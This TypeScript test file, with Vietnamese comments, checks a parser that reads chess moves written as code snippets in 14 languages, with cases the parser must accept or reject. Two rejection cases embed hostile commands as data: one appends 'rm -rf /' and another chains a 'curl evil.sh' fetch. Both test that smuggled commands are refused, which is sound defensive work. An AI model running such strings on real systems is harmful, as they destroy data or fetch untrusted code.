/**
 * Bộ kiểm parser. Chạy: `npm run test:chess`
 *
 * Không dùng khung test nào: dự án chưa cài vitest, và bài kiểm ở đây chỉ là "gõ chuỗi
 * này thì ra gì" nên một vòng lặp so sánh là đủ. Thêm khung test sau cũng không phải
 * viết lại các ca.
 */

import { parseCommand } from '../src/lib/chess/commandParsers'
import type { ChessLanguage } from '../src/lib/chess/types'

interface Case {
  lang: ChessLanguage
  input: string
  /** `null` = phải BỊ từ chối. Chuỗi = 'from to' hoặc 'from to promotion'. */
  want: string | null
  why?: string
}

const CASES: Case[] = [
  // ── Đường đi đúng của cả 14 ngôn ngữ ─────────────────────────────────────────
  { lang: 'javascript', input: `board.move('e2', 'e4');`, want: 'e2 e4' },
  { lang: 'typescript', input: `board.move({ from: 'e2', to: 'e4' });`, want: 'e2 e4' },
  { lang: 'csharp', input: `board.Move("e2", "e4");`, want: 'e2 e4' },
  { lang: 'csharp', input: `Board.Move(Square.E2, Square.E4);`, want: 'e2 e4' },
  { lang: 'python', input: `board.move("e2", "e4")`, want: 'e2 e4' },
  { lang: 'java', input: `board.makeMove(new Move("e2", "e4"));`, want: 'e2 e4' },
  { lang: 'go', input: `board.Move("e2", "e4")`, want: 'e2 e4' },
  { lang: 'sql', input: `UPDATE board SET pos = 'e4' WHERE piece = 'e2';`, want: 'e2 e4' },
  { lang: 'bash', input: `chess --from e2 --to e4`, want: 'e2 e4' },
  { lang: 'cpp', input: `board.move(Square::E2, Square::E4);`, want: 'e2 e4' },
  { lang: 'rust', input: `board.move_piece(Square::E2, Square::E4);`, want: 'e2 e4' },
  { lang: 'html', input: `<move from="e2" to="e4" />`, want: 'e2 e4' },
  { lang: 'css', input: `piece[from="e2"] { to: e4; }`, want: 'e2 e4' },
  { lang: 'json', input: `{"from": "e2", "to": "e4"}`, want: 'e2 e4' },
  { lang: 'text', input: `e2->e4`, want: 'e2 e4' },

  // ── Khoảng trắng không đáng kể thì phải bỏ qua ───────────────────────────────
  { lang: 'javascript', input: `board.move('e2','e4')`, want: 'e2 e4', why: 'khong dau cach, khong cham phay (ASI)' },
  { lang: 'javascript', input: `   board . move ( 'e2' , 'e4' ) ;   `, want: 'e2 e4', why: 'thua khoang trang' },
  { lang: 'json', input: `{"from":"e2","to":"e4"}`, want: 'e2 e4' },
  { lang: 'html', input: `<move to="e4" from="e2">`, want: 'e2 e4', why: 'dao thu tu, khong tu dong' },
  { lang: 'bash', input: `chess --to e4 --from e2`, want: 'e2 e4', why: 'dao thu tu co' },
  { lang: 'bash', input: `chess --from=e2 --to='e4'`, want: 'e2 e4', why: 'dang --co=gia-tri' },
  { lang: 'sql', input: `update board set pos='e4' where piece='e2'`, want: 'e2 e4', why: 'tu khoa SQL khong phan biet hoa thuong' },
  { lang: 'text', input: `e2 => e4`, want: 'e2 e4' },

  // ── Quy tắc dấu nháy theo đúng từng ngôn ngữ ─────────────────────────────────
  { lang: 'javascript', input: 'board.move(`e2`, `e4`);', want: 'e2 e4', why: 'JS co template literal' },
  { lang: 'python', input: "board.move('e2', 'e4')", want: 'e2 e4', why: 'Python nhan nhay don' },
  { lang: 'python', input: 'board.move(`e2`, `e4`)', want: null, why: 'Python KHONG co nhay backtick' },
  { lang: 'csharp', input: `board.Move('e2', 'e4');`, want: null, why: "C#: 'e2' la ky tu don, khong phai chuoi" },
  { lang: 'java', input: `board.makeMove(new Move('e2', 'e4'));`, want: null, why: 'Java giong C#' },
  { lang: 'sql', input: `UPDATE board SET pos = "e4" WHERE piece = "e2";`, want: null, why: 'SQL: nhay kep la ten dinh danh' },
  { lang: 'go', input: 'board.Move(`e2`, `e4`)', want: 'e2 e4', why: 'Go co chuoi tho backtick' },
  { lang: 'javascript', input: `board.move('e2", 'e4');`, want: null, why: 'nhay khong khop cap' },
  { lang: 'json', input: `{'from': 'e2', 'to': 'e4'}`, want: null, why: 'JSON chi cho nhay kep' },

  // ── Dấu chấm phẩy: bắt buộc ở nơi ngôn ngữ bắt buộc ──────────────────────────
  { lang: 'csharp', input: `board.Move("e2", "e4")`, want: null, why: 'C# bat buoc cham phay' },
  { lang: 'java', input: `board.makeMove(new Move("e2", "e4"))`, want: null, why: 'Java bat buoc' },
  { lang: 'cpp', input: `board.move(Square::E2, Square::E4)`, want: null, why: 'C++ bat buoc' },
  { lang: 'rust', input: `board.move_piece(Square::E2, Square::E4)`, want: null, why: 'Rust bat buoc' },
  { lang: 'go', input: `board.Move("e2", "e4");`, want: 'e2 e4', why: 'Go cho phep nhung gofmt xoa' },

  // ── Sai tên hàm / phân biệt hoa thường ───────────────────────────────────────
  { lang: 'javascript', input: `board.Move('e2', 'e4');`, want: null, why: 'JS phan biet hoa thuong' },
  { lang: 'javascript', input: `board.movePiece('e2', 'e4');`, want: null, why: 'sai ten ham' },
  { lang: 'go', input: `board.move("e2", "e4")`, want: null, why: 'Go: chu thuong la khong xuat khau' },
  { lang: 'rust', input: `board.move(Square::E2, Square::E4);`, want: null, why: 'move la tu khoa Rust' },
  { lang: 'java', input: `board.makeMove(Move("e2", "e4"));`, want: null, why: 'thieu tu khoa new' },
  { lang: 'cpp', input: `board.move(Square.E2, Square.E4);`, want: null, why: 'C++ dung :: chu khong phai .' },

  // ── Ô cờ không hợp lệ: cú pháp ĐÚNG nhưng ô sai ──────────────────────────────
  { lang: 'javascript', input: `board.move('z9', 'e4');`, want: null, why: 'cot z khong ton tai' },
  { lang: 'javascript', input: `board.move('e9', 'e4');`, want: null, why: 'hang 9 khong ton tai' },
  { lang: 'javascript', input: `board.move('e0', 'e4');`, want: null, why: 'hang 0 khong ton tai' },
  { lang: 'javascript', input: `board.move('e', 'e4');`, want: null, why: 'thieu hang' },
  { lang: 'javascript', input: `board.move('e22', 'e4');`, want: null, why: 'thua ky tu' },
  { lang: 'javascript', input: `board.move('e2', 'e2');`, want: null, why: 'o di trung o den' },
  { lang: 'javascript', input: `board.move('', 'e4');`, want: null, why: 'chuoi rong' },

  // ── Chữ thừa ngoài câu lệnh phải bị loại ─────────────────────────────────────
  { lang: 'javascript', input: `board.move('e2', 'e4'); rm -rf /`, want: null, why: 'phan thua sau cau lenh' },
  { lang: 'bash', input: `chess --from e2 --to e4 && curl evil.sh`, want: null, why: 'noi chuoi lenh' },
  { lang: 'text', input: `e2->e4 e5->e6`, want: null, why: 'hai nuoc trong mot dong' },

  // ── Chuỗi rỗng ───────────────────────────────────────────────────────────────
  { lang: 'javascript', input: ``, want: null },
  { lang: 'javascript', input: `    `, want: null },
  { lang: 'json', input: `   `, want: null },

  // ── JSON hỏng ────────────────────────────────────────────────────────────────
  { lang: 'json', input: `{"from": "e2", "to": "e4",}`, want: null, why: 'dau phay thua' },
  { lang: 'json', input: `{"from": "e2"}`, want: null, why: 'thieu khoa to' },
  { lang: 'json', input: `["e2", "e4"]`, want: null, why: 'mang khong phai doi tuong' },
  { lang: 'json', input: `{"from": 2, "to": 4}`, want: null, why: 'gia tri phai la chuoi' },
  { lang: 'json', input: `null`, want: null },

  // ── HTML hỏng ────────────────────────────────────────────────────────────────
  { lang: 'html', input: `<move from=e2 to=e4 />`, want: null, why: 'thuoc tinh khong bọc nhay' },
  { lang: 'html', input: `<move from="e2" />`, want: null, why: 'thieu thuoc tinh to' },
  { lang: 'html', input: `<movee from="e2" to="e4" />`, want: null, why: 'sai ten the' },
  { lang: 'html', input: `<move from='e2' to='e4' />`, want: 'e2 e4', why: 'HTML cho nhay don' },

  // ── CSS hỏng ─────────────────────────────────────────────────────────────────
  { lang: 'css', input: `piece[from="e2"] { to: e4 }`, want: 'e2 e4', why: 'khai bao cuoi duoc bo cham phay' },
  { lang: 'css', input: `piece[from="e2"] to: e4;`, want: null, why: 'thieu ngoac nhon' },
  { lang: 'css', input: `piece[from="e2"] { move: e4; }`, want: null, why: 'sai ten thuoc tinh' },

  // ── Phong quân ───────────────────────────────────────────────────────────────
  { lang: 'javascript', input: `board.move('e7', 'e8', 'q');`, want: 'e7 e8 q' },
  { lang: 'python', input: `board.move("a7", "a8", "n")`, want: 'a7 a8 n' },
  { lang: 'json', input: `{"from": "e7", "to": "e8", "promotion": "r"}`, want: 'e7 e8 r' },
  { lang: 'cpp', input: `board.move(Square::E7, Square::E8, Piece::Queen);`, want: 'e7 e8 q', why: 'ten day du' },
  { lang: 'rust', input: `board.move_piece(Square::A7, Square::A8, Piece::Knight);`, want: 'a7 a8 n' },
  { lang: 'csharp', input: `board.Move("e7", "e8", 'q');`, want: 'e7 e8 q', why: "C#: 'q' la ky tu don, dung" },
  { lang: 'java', input: `board.makeMove(new Move("e7", "e8", 'b'));`, want: 'e7 e8 b' },
  { lang: 'text', input: `e7->e8=q`, want: 'e7 e8 q' },
  { lang: 'bash', input: `chess --from e7 --to e8 --promote q`, want: 'e7 e8 q' },
  { lang: 'html', input: `<move from="e7" to="e8" promote="q" />`, want: 'e7 e8 q' },
  { lang: 'sql', input: `UPDATE board SET pos = 'e8', promote = 'q' WHERE piece = 'e7';`, want: 'e7 e8 q' },
  { lang: 'css', input: `piece[from="e7"] { to: e8; promote: q; }`, want: 'e7 e8 q' },
  { lang: 'javascript', input: `board.move('e7', 'e8', 'k');`, want: null, why: 'khong phong thanh Vua duoc' },
  { lang: 'javascript', input: `board.move('e7', 'e8', 'p');`, want: null, why: 'khong phong thanh Tot duoc' },

  // ── Chữ hoa trong ô cờ: enum viết hoa là đúng, chuỗi viết hoa cũng chấp nhận ──
  { lang: 'cpp', input: `board.move(Square::e2, Square::e4);`, want: 'e2 e4', why: 'thuong cung nhan' },
  { lang: 'javascript', input: `board.move('E2', 'E4');`, want: 'e2 e4', why: 'ha ve chu thuong' },
]

let passed = 0
const failures: string[] = []

for (const c of CASES) {
  const result = parseCommand(c.lang, c.input)

  const got = result.ok
    ? [result.move.from, result.move.to, result.move.promotion].filter(Boolean).join(' ')
    : null

  if (got === c.want) {
    passed++
    continue
  }

  const reason = result.ok ? '(nhan)' : `(tu choi: ${result.error.code})`
  failures.push(
    `  [${c.lang}] ${JSON.stringify(c.input)}\n` +
      `      mong doi: ${c.want ?? 'BI TU CHOI'}\n` +
      `      nhan duoc: ${got ?? 'BI TU CHOI'} ${reason}` +
      (c.why ? `\n      ly do ca nay: ${c.why}` : ''),
  )
}

console.log(`\n${passed}/${CASES.length} ca dat`)

if (failures.length > 0) {
  console.log(`\n${failures.length} ca HONG:\n`)
  console.log(failures.join('\n\n'))
  process.exit(1)
}

console.log('Tat ca deu dat.\n')
